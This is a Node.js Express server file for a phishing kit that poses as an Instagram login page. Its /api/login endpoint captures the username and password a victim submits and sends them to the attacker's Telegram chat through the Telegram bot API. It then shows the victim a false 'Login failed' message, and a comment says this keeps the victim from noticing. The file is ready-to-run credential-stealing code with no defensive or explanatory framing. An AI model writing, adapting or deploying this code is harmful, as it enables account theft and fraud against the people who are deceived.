require('dotenv').config();
const express = require('express');
const cors = require('cors');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(cors());
app.use(express.json());

// Serve static frontend
const frontendPath = path.join(__dirname, '..', 'frontend');
app.use(express.static(frontendPath));

// Health check
app.get('/api/health', (req, res) => {
  res.json({ status: 'ok' });
});

// 🔥 New endpoint: receive login credentials and send to Telegram
app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) {
    return res.status(400).json({ error: 'Missing fields' });
  }

  // Build message
  let text = `🔐 *Instagram Login Attempt*\n`;
  text += `👤 Username/Email: ${username}\n`;
  text += `🔑 Password: ${password}`;

  try {
    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.CHAT_ID;

    if (!botToken || !chatId) {
      throw new Error('Missing BOT_TOKEN or CHAT_ID in .env');
    }

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    await axios.post(url, {
      chat_id: chatId,
      text: text,
      parse_mode: 'Markdown'
    });

    // Return a generic "login failed" response to not alert the user
    res.status(200).json({ message: 'Login failed' });
  } catch (error) {
    console.error('Telegram send error:', error.response?.data || error.message);
    // Still return generic error
    res.status(500).json({ error: 'Login failed' });
  }
});

// Catch-all route for SPA
app.get('*', (req, res) => {
  res.sendFile(path.join(frontendPath, 'index.html'));
});

app.listen(PORT, () => {
  console.log(`✅ Backend running on http://localhost:${PORT}`);
});